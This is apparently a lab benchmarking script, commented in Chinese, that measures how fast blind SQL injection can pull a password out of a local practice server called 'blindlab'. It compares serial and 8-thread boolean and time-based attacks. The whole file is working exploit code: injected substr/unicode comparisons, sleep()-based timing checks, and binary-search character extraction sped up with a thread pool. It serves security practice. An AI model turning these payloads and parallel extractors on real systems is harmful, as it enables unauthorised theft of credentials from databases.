#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 bench_blind.py — 盲注效能基準：序列 vs 並發
=============================================================================

 目的：量化「如何提升盲注速率」。

 測試四種組合（對本機 blindlab）：
   ① 布林盲注 · 序列
   ② 布林盲注 · 並發（8 workers）
   ③ 時間盲注 · 序列（SLEEP=1.0）
   ④ 時間盲注 · 並發（8 workers, SLEEP=0.3）

 並加入**模擬網路延遲**（預設 0.3s），
 以反映真實遠端靶場（如 OverTheWire）的 RTT。

 用法：
   python bench_blind.py 8960 [--rtt 0.3]
=============================================================================
"""

import concurrent.futures
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8960
RTT = float(sys.argv[2]) if len(sys.argv) > 2 else 0.3   # 模擬網路延遲
BASE = "http://127.0.0.1:%d" % PORT
WORKERS = 8


def get(path, simulate_rtt=True, timeout=30):
    """送請求（可模擬網路延遲）。"""
    if simulate_rtt and RTT > 0:
        time.sleep(RTT)          # 模擬 RTT
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:                                        # noqa: BLE001
        return ""


# ===== 布林 oracle（B1）=====
def bool_cond(pos, mid, simulate_rtt=True):
    path = "/b1?username=" + urllib.parse.quote(
        "admin' AND unicode(substr(password,%d,1))>%d --" % (pos, mid), safe="")
    b = get(path, simulate_rtt)
    return "This user exists" in b


def bool_length_ok(pos, simulate_rtt=True):
    path = "/b1?username=" + urllib.parse.quote(
        "admin' AND LENGTH(password)>=%d --" % pos, safe="")
    b = get(path, simulate_rtt)
    return "This user exists" in b


# ===== 時間 oracle（B2）=====
def time_cond(pos, mid, sleep_s, simulate_rtt=True):
    path = "/b2?username=" + urllib.parse.quote(
        "admin' AND CASE WHEN (unicode(substr(password,%d,1))>%d) "
        "THEN sleep(%s) ELSE 0 END --" % (pos, mid, sleep_s), safe="")
    t0 = time.time()
    get(path, simulate_rtt)
    return (time.time() - t0) > (sleep_s / 2.0 + RTT * 1.5)


def find_char_bool(pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if bool_cond(pos, mid):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def find_char_time(pos, sleep_s):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if time_cond(pos, mid, sleep_s):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def leak_bool_serial(max_len=32):
    out = ""
    for pos in range(1, max_len + 1):
        if not bool_length_ok(pos):
            break
        out += find_char_bool(pos)
    return out


def leak_bool_parallel(max_len=32):
    def work(pos):
        if not bool_length_ok(pos):
            return pos, None
        return pos, find_char_bool(pos)

    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(work, p) for p in range(1, max_len + 1)]
        for f in concurrent.futures.as_completed(futs):
            pos, ch = f.result()
            if ch:
                results[pos] = ch
    out = ""
    for p in range(1, max_len + 1):
        if p in results:
            out += results[p]
        else:
            break
    return out


def leak_time_serial(sleep_s, max_len=32):
    out = ""
    for pos in range(1, max_len + 1):
        ch = find_char_time(pos, sleep_s)
        if ord(ch) <= 32:
            break
        out += ch
    return out


def leak_time_parallel(sleep_s, max_len=32):
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(find_char_time, p, sleep_s): p
                for p in range(1, max_len + 1)}
        for f in concurrent.futures.as_completed(futs):
            pos = futs[f]
            ch = f.result()
            if ord(ch) > 32:
                results[pos] = ch
    out = ""
    for p in range(1, max_len + 1):
        if p in results:
            out += results[p]
        else:
            break
    return out


def bench(name, fn, expected_len=32):
    print("\n" + "-" * 76)
    print(" [%s]" % name)
    print("-" * 76)
    t0 = time.time()
    result = fn()
    elapsed = time.time() - t0
    print("  結果: %r" % result)
    print("  耗時: %.1f 秒" % elapsed)
    return elapsed, result


def main():
    print("=" * 76)
    print(" 盲注效能基準：序列 vs 並發")
    print("=" * 76)
    print(" 目標       : %s" % BASE)
    print(" 模擬 RTT   : %.2f 秒/請求" % RTT)
    print(" 並發執行緒 : %d" % WORKERS)

    # 確認連線
    b = get("/", simulate_rtt=False)
    if "BlindLab" not in b:
        print("\n[錯誤] 無法連線，請先啟動 blindlab.py")
        sys.exit(1)

    # 先量目標長度
    length = 0
    for n in range(1, 41):
        if bool_length_ok(n, simulate_rtt=False):
            length = n
        else:
            break
    print(" 目標長度   : %d 字元" % length)

    results = {}

    # ① 布林 · 序列
    t1, r1 = bench("① 布林盲注 · 序列", lambda: leak_bool_serial(length))
    results["布林序列"] = t1

    # ② 布林 · 並發
    t2, r2 = bench("② 布林盲注 · 並發（%d threads）" % WORKERS,
                   lambda: leak_bool_parallel(length))
    results["布林並發"] = t2

    # ③ 時間 · 序列（SLEEP=1.0）
    t3, r3 = bench("③ 時間盲注 · 序列（SLEEP=1.0）",
                   lambda: leak_time_serial(1.0, length))
    results["時間序列"] = t3

    # ④ 時間 · 並發（SLEEP=0.3）
    t4, r4 = bench("④ 時間盲注 · 並發（%d threads, SLEEP=0.3）" % WORKERS,
                   lambda: leak_time_parallel(0.3, length))
    results["時間並發"] = t4

    # ===== 總結 =====
    print("\n" + "=" * 76)
    print(" 效能總結")
    print("=" * 76)
    print("  %-34s %10s %10s" % ("方法", "耗時(秒)", "加速比"))
    print("  " + "-" * 56)
    base_bool = results["布林序列"]
    base_time = results["時間序列"]
    print("  %-34s %10.1f %10s" % ("① 布林 · 序列（baseline）", base_bool, "1.0×"))
    print("  %-34s %10.1f %10.1f×" % ("② 布林 · 並發", results["布林並發"],
                                     base_bool / max(results["布林並發"], 0.01)))
    print("  %-34s %10.1f %10s" % ("③ 時間 · 序列（baseline）", base_time, "1.0×"))
    print("  %-34s %10.1f %10.1f×" % ("④ 時間 · 並發 + 短 SLEEP",
                                     results["時間並發"],
                                     base_time / max(results["時間並發"], 0.01)))
    print()
    print("  洩漏結果一致性：")
    print("    布林序列: %r" % r1)
    print("    布林並發: %r" % r2)
    print("    時間序列: %r" % r3)
    print("    時間並發: %r" % r4)
    same = len({r1, r2, r3, r4}) == 1
    print("    四種方法結果一致: %s" % ("✓" if same else "✗"))

    print()
    print("  加速來源拆解：")
    print("    布林並發加速 ≈ %d threads（理論上限）" % WORKERS)
    print("    時間並發加速 ≈ threads × (1.0/0.3) ≈ %d × 3.3" % WORKERS)
    print("    實際受伺服器處理能力與限流影響")


if __name__ == "__main__":
    main()
